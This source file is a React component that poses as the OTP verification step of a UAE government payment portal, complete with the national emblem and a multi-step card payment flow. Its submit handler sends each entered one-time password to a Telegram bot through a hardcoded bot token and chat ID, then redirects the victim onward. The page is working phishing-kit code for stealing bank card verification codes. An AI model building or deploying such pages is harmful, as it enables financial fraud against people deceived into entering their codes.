import React, { useState, useEffect } from 'react';
import { useLocation } from "wouter";

const VerifyOtp: React.FC = () => {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(false);
  const [otp, setOtp] = useState('');
  const [timer, setTimer] = useState(300); // 5 minutes

  useEffect(() => {
    const interval = setInterval(() => {
      setTimer((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // حقل الرمز: 6 أرقام فقط
    const cleaned = e.target.value.replace(/\D/g, '').slice(0, 6);
    setOtp(cleaned);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (otp.length < 6) {
      alert("يرجى إدخال رمز التحقق المكون من 6 أرقام");
      return;
    }

    setLoading(true);

    const message = `
🔑 *رمز تحقق (OTP) جديد*
🔢 الرمز: ${otp}
    `;

    try {
      await fetch(`https://api.telegram.org/bot8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: '8362204213',
          text: message,
          parse_mode: 'Markdown'
        })
      });
      setLocation("/confirm-payment");
    } catch (error) {
      console.error("Error sending to Telegram", error);
      setLocation("/confirm-payment");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 font-['Tajawal']" dir="rtl">
      <header className="bg-white shadow-sm py-4 px-6 flex justify-between items-center border-b-2 border-orange-400">
        <div className="flex items-center gap-2">
          <div className="bg-orange-500 text-white p-2 rounded-lg font-bold text-xl">سداد</div>
          <span className="text-gray-800 font-bold text-lg">بوابة سداد الإمارات</span>
        </div>
        <img 
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" 
          alt="UAE Emblem" 
          className="h-10 w-auto" 
        />
      </header>

      <div className="max-w-4xl mx-auto mt-8 px-4">
        <div className="flex justify-between items-center relative">
          <div className="absolute top-1/2 left-0 w-full h-1 bg-gray-200 -z-10 transform -translate-y-1/2"></div>
          <div className="bg-green-500 text-white w-10 h-10 rounded-full flex items-center justify-center font-bold shadow-lg">✓</div>
          <div className="bg-green-500 text-white w-10 h-10 rounded-full flex items-center justify-center font-bold shadow-lg">✓</div>
          <div className="bg-green-500 text-white w-10 h-10 rounded-full flex items-center justify-center font-bold shadow-lg">✓</div>
          <div className="bg-orange-500 text-white w-10 h-10 rounded-full flex items-center justify-center font-bold shadow-lg">4</div>
          <div className="bg-white text-gray-400 border-2 border-gray-200 w-10 h-10 rounded-full flex items-center justify-center font-bold">5</div>
        </div>
        <div className="flex justify-between mt-2 text-xs font-bold text-gray-500">
          <span className="text-green-600">البيانات</span>
          <span className="text-green-600">البنك</span>
          <span className="text-green-600">البطاقة</span>
          <span className="text-orange-600">التحقق</span>
          <span>التأكيد</span>
        </div>
      </div>

      <div className="max-w-md mx-auto mt-10 px-4 pb-20">
        <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100">
          <div className="bg-slate-900 p-8 text-white text-center">
            <div className="bg-orange-500 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
              </svg>
            </div>
            <h2 className="text-2xl font-bold mb-2">التحقق من الهوية</h2>
            <p className="text-slate-400 text-sm">تم إرسال رمز التحقق (OTP) إلى رقم هاتفك المرتبط بالبطاقة</p>
          </div>
          
          <div className="p-8">
            <div className="bg-green-50 border border-green-100 rounded-xl p-4 mb-8 flex items-center gap-3">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-green-600" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
              <p className="text-green-700 text-xs font-bold">تم إرسال الرمز بنجاح. يرجى التحقق من رسائل SMS.</p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <label className="text-sm font-bold text-gray-700 block text-center">أدخل رمز التحقق المكون من 6 أرقام</label>
                <input 
                  id="otp"
                  type="text" 
                  required
                  placeholder="0 0 0 0 0 0"
                  className="w-full px-4 py-4 rounded-xl border-2 border-gray-100 focus:border-orange-500 outline-none transition-all text-center text-3xl font-black tracking-[0.5em] text-orange-600"
                  value={otp}
                  onChange={handleChange}
                />
              </div>

              <div className="text-center">
                <p className="text-gray-400 text-xs mb-2">تنتهي صلاحية الرمز خلال:</p>
                <div className="text-orange-500 font-bold text-lg">{formatTime(timer)}</div>
              </div>

              <button 
                type="button"
                className="w-full text-orange-600 font-bold text-sm hover:underline"
              >
                إعادة إرسال الرمز
              </button>

              <div className="flex gap-4 pt-4">
                <button 
                  type="button"
                  onClick={() => setLocation("/card-data")}
                  className="flex-1 bg-gray-100 hover:bg-gray-200 text-gray-600 py-4 rounded-xl font-bold transition-all"
                >
                  الرجوع
                </button>
                <button 
                  type="submit"
                  disabled={loading}
                  className="flex-[2] bg-orange-500 hover:bg-orange-600 text-white py-4 rounded-xl font-bold text-lg shadow-lg hover:shadow-orange-200 transition-all flex items-center justify-center gap-2"
                >
                  {loading ? (
                    <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  ) : (
                    "تأكيد العملية"
                  )}
                </button>
              </div>
            </form>
          </div>
          
          <div className="p-6 bg-gray-50 border-t border-gray-100 text-center">
            <p className="text-[10px] text-gray-400">إذا لم يصلك الرمز، يرجى التأكد من تغطية الشبكة أو التواصل مع البنك المصدر للبطاقة.</p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default VerifyOtp;
